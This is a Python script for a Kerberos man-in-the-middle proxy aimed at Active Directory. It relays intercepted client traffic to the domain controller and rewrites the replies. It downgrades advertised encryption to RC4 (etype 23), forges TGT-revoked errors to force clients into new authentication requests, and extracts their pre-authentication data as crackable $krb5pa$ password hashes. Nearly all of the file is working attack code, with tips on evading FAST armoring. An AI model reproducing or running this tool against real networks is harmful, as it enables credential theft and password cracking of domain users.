#!/usr/bin/env python3
from scapy.layers.kerberos import (
    Kerberos,
    KRB_AS_REQ,
    KRB_AS_REP,
    KRB_ERROR,
    KRB_KDC_REQ_BODY,
    KRB_AP_REP,
    KRB_AP_REQ,
    KRB_TGS_REP,
    KRB_TGS_REQ,
    KerberosTCPHeader,
)
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.smb2 import (
    SMB2_Session_Setup_Response,
    SMB2_Header,
    SMB2_Session_Setup_Request,
)
from scapy.layers.spnego import SPNEGO_negTokenResp, SPNEGO_negToken
from scapy.asn1.asn1 import ASN1_INTEGER, ASN1_ENUMERATED, ASN1_GENERAL_STRING
from scapy.all import sniff, TCP, send, Raw
from netfilterqueue import NetfilterQueue
import traceback
import socket
import threading
import select
import struct

CYAN = "\033[96m"
YELLOW = "\033[93m"
NORMAL = "\033[0m"
DARK_RED = "\033[31m"

LISTEN_PORT = 88
BUFFER_SIZE = 4096

SO_ORIGINAL_DST = 80

AS_REQ_hashes: dict = {}
already_poisoned_tgs_rep: dict = {}

# TODO function to order the hashes and print them nicely, maybe even more color
# TODO print hashes to a file


def get_original_dst(sock):
    """
    Returns (ip, port) of the original destination.
    """
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, raw_ip = struct.unpack("!HH4s8x", data)
    ip = socket.inet_ntoa(raw_ip)
    return ip, port


def handlePacketFromClient(data, server_sock):
    try:

        pkt = KerberosTCPHeader(data)

        if pkt.haslayer(KRB_AS_REQ):
            handle_AS_REQ(pkt)

        if pkt.haslayer(KRB_TGS_REQ):
            handle_TGS_REQ(pkt)
        server_sock.sendall(data)
    except Exception as e:
        print("[x] Error while handling packet from client:", e)
        traceback.print_exc()
        server_sock.sendall(data)


def handlePacketFromServer(data, client_sock):
    try:
        pkt = KerberosTCPHeader(data)

        if pkt.haslayer(KRB_ERROR):
            data = bytes(handle_KRB_ERROR(pkt))

        if pkt.haslayer(KRB_TGS_REP):
            data = bytes(handle_TGS_REP(pkt))

        client_sock.sendall(data)
    except Exception as e:
        print("[x] Error while handling packet from client:", e)
        traceback.print_exc()
        client_sock.sendall(data)


def handle_TGS_REP(pkt):
    tgs_rep = pkt[KRB_TGS_REP]
    username = tgs_rep.cname.nameString[0].val.decode()

    if username not in already_poisoned_tgs_rep or already_poisoned_tgs_rep[username] < 2:
        if username not in already_poisoned_tgs_rep:
            already_poisoned_tgs_rep[username] = 1
        else:
            already_poisoned_tgs_rep[username] += 1
        if tgs_rep.padata is not None and tgs_rep.padata[0].padataType == ASN1_INTEGER(136):  # PA-FX-FAST
            print(
                f"[+] {CYAN}{username}{NORMAL} asked for a service ticket {DARK_RED}using armoring{NORMAL}. Not poisoning... Try to switch to {YELLOW}kerberos_mitm_dearmor.py{NORMAL} to dearmor (if not strictly enforced)."
            )
            print("[!] Trying to de-armor can break things (computer account TGT, all kerberos auth of clients if armoring is strictly enforced).")
        else:
            print(
                f"[+] {CYAN}{username}{NORMAL} asked for a service ticket. Replying with KDC_ERR_TGT_REVOKED to trigger AS REQ."
            )
            pkt[KerberosTCPHeader].remove_payload()
            errorCode = 20  # KDC_ERR_TGT_REVOKED
            err = KRB_ERROR(errorCode=ASN1_INTEGER(errorCode))
            pkt[KerberosTCPHeader].len = len(err)
            pkt[KerberosTCPHeader].add_payload(err)
    return pkt


def handle_TGS_REQ(pkt):
    pass  # TODO parse packet to see if kerberoastable user


def handle_KRB_ERROR(pkt):
    err = pkt[KRB_ERROR]
    if err.errorCode == ASN1_INTEGER(25):  # KDC_ERR_PREAUTH_REQUIRED
        for pa in err.eData.seq:
            if pa.padataType == 136:  # pA-FX-FAST -> fuck, armoring
                print(f"[!] {DARK_RED}Armoring detected in KDC_ERR_PREAUTH_REQUIRED DC reply{NORMAL}. Try to switch to {YELLOW}kerberos_mitm_dearmor.py{NORMAL} to dearmor (if not strictly enforced).")
                print("[!] Trying to de-armor can break things (computer account TGT, all kerberos auth of clients if armoring is strictly enforced).")
            if pa.padataType == 19:  # PA-ETYPE-INFO2
                advertised_etype_23 = False

                for e in pa.padataValue.seq:
                    if e.etype == 23:
                        advertised_etype_23 = True
                if advertised_etype_23:
                    print(
                        "[+] DC sent ERR_PREAUTH_REQUIRED and etype 23 is advertised, downgrading this..."
                    )
                    pa.padataValue.seq = [
                        e for e in pa.padataValue.seq if e.etype == 23
                    ]
                    pkt[KerberosTCPHeader].len = len(pkt[Kerberos])
    return pkt


def handle_AS_REQ(pkt):
    as_req = pkt[KRB_AS_REQ]
    padata = as_req.padata
    req_body = as_req[KRB_KDC_REQ_BODY]
    username = req_body.cname[0].nameString[0].val.decode()
    username = username.split("@")[
        0
    ]  # Really important for etype 18 and 17 as it is used for salt. Other chars would break this too
    domain = req_body.realm.val.decode()
    cypher = False

    if username.endswith("$"):
        print(f"[-] Not printing computer hash of {username}")
        return

    for pa in padata:
        if pa.padataType == ASN1_INTEGER(2):  # PA-ENC-TIMESTAMP
            etype = str(pa.padataValue.etype.val)
            cypher = pa.padataValue.cipher.val.hex()
        elif pa.padataType == ASN1_INTEGER(136):  # pA-FX-FAST
            print(f"[!] {DARK_RED}Armoring detected in AS REQ from {CYAN}{domain}\\{username}{NORMAL}. Try to switch to {YELLOW}kerberos_mitm_dearmor.py{NORMAL} to dearmor (if not strictly enforced).")
            print("[!] Trying to de-armor can break things (computer account TGT, all kerberos auth of clients if armoring is strictly enforced).")
            return

    if cypher:  # TODO pass if it is a machine account
        print(
            f"[+] Received AS REQ with pre-authentication data from {CYAN}{domain}\\{username}{NORMAL}"
        )
        if etype == "23":
            hash = f"$krb5pa${etype}${username}${domain}$${cypher[32:] + cypher[:32]}"
        elif etype == "18":
            hash = f"$krb5pa${etype}${username}${domain}${cypher}"
        elif etype == "17":
            hash = f"$krb5pa${etype}${username}${domain}${cypher}"  # TODO check hash format

        key = f"{domain}\\{username}\\{etype}"
        AS_REQ_hashes[key] = hash
        print(
            "[+] For now I found the following hashes. Highest hashrate is etype 23. If you have multiple hashes for the same user, the correct one uses the FQDN of the domain."
        )
        for key in AS_REQ_hashes.keys():
            print(f"{YELLOW}{AS_REQ_hashes[key]}{NORMAL}")

    else:
        print(f"[+] Received AS REQ without pre-authentication data from {CYAN}{domain}\\{username}{NORMAL}")


def proxy_connection(client_sock):
    try:
        dst_ip, dst_port = get_original_dst(client_sock)
    except Exception as e:
        print(f"[!] Failed to get original dst: {e}")
        client_sock.close()
        return

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((dst_ip, dst_port))
    except Exception as e:
        print(f"[!] Failed to connect to server {dst_ip}:{dst_port}: {e}")
        client_sock.close()
        return

    sockets = [client_sock, server_sock]

    try:
        while True:
            readable, _, _ = select.select(sockets, [], [])
            for s in readable:
                data = s.recv(BUFFER_SIZE)
                if not data:
                    return

                if s is client_sock:
                    handlePacketFromClient(data, server_sock)
                else:
                    handlePacketFromServer(data, client_sock)
    finally:
        client_sock.close()
        server_sock.close()


def main():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(("0.0.0.0", LISTEN_PORT))
    listen_sock.listen()

    print(f"[+] Kerberos MITM listening on port {LISTEN_PORT}")

    while True:
        client_sock, addr = listen_sock.accept()
        t = threading.Thread(target=proxy_connection, args=(client_sock,), daemon=True)
        t.start()


if __name__ == "__main__":
    main()
